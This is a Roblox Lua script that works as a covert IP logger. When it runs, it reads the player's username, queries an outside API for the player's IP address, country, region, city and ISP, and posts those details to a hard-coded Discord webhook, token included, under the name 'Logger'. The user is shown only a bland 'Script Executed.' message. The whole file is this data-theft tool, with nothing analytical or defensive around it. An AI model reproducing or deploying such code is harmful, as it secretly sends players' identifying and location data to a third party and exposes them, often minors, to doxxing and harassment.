local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local api = "https://velonix-ip-api.vercel.app/api/ip"
local webhook = "https://discord.com/api/webhooks/1393398739812487189/D8MlZ7oGZ70VwMX045sIHBDmWUmBEvtBDDqJe97pJBfaSFZgQA2zRllrJKs-b8GOqXO9"
local success, response = pcall(function()
	return HttpService:GetAsync(api)
end)

if success then
	local data = HttpService:JSONDecode(response)

	local player = Players.LocalPlayer
	local username = player and player.Name or "Unknown"

	local payload = {
		username = "Logger",
		embeds = {{
			title = "📡 User:",
			description = "**User:** `" .. username .. "`\n"
				.. "**IP:** `" .. (data.ip or "Unknown") .. "`\n"
				.. "**Country:** `" .. (data.country or "Unknown") .. "`\n"
				.. "**Region:** `" .. (data.region or "Unknown") .. "`\n"
				.. "**City:** `" .. (data.city or "Unknown") .. "`\n"
				.. "**ISP:** `" .. (data.org or "Unknown") .. "`",
			color = 3447003,
			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
		}}
	}

	local jsonPayload = HttpService:JSONEncode(payload)
	local successWebhook, result = pcall(function()
		return HttpService:RequestAsync({
			Url = webhook,
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json"
			},
			Body = jsonPayload
		})
	end)
	if successWebhook and result.Success then
		print("✅ Script Executed.")
	else
		warn("❌ Missing Execution Logic: ", result and result.StatusCode)
	end
else
	warn("❌ Failed to send.")
end